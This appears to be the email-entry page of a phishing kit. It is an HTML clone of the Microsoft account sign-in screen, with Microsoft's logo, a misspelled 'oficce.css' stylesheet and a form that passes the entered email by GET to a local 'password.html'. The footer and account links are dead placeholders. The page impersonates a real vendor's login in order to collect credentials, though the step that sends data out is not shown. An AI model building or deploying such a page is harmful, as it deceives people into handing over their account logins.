<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="oficce.css">
</head>
<body>
    <div class="page-container">
        <img src="images/imgi_3_4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg" class="bg-image" alt="Background">

        <main class="card">
            <div class="logo-container">
                <img src="images/imgi_4_microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" alt="Microsoft Logo" class="logo">
            </div>

            <h1>Sign in</h1>
            <p class="subtitle">Use your Microsoft account.</p>

            <!-- Form submits email to password.html via GET parameter -->
            <form action="password.html" method="GET">
                <div class="input-group">
                    <input type="text" id="emailInput" name="email" placeholder="Email or phone number" required autocomplete="username">
                </div>

                <div class="forgot-link">
                    <a href="#">Forgot your username?</a>
                </div>

                <button type="submit" class="submit-button">Next</button>
            </form>

            <div class="create-account">
                New to Microsoft? <a href="#">Create an account</a>
            </div>
        </main>

        <footer class="footer">
            <div class="footer-links">
                <a href="#">Help and feedback</a>
                <a href="#">Terms of use</a>
                <a href="#">Privacy and cookies</a>
            </div>
            <div class="footer-note">
                Use private browsing if this is not your device. <a href="#">Learn more</a>
            </div>
        </footer>
    </div>
</body>
</html>
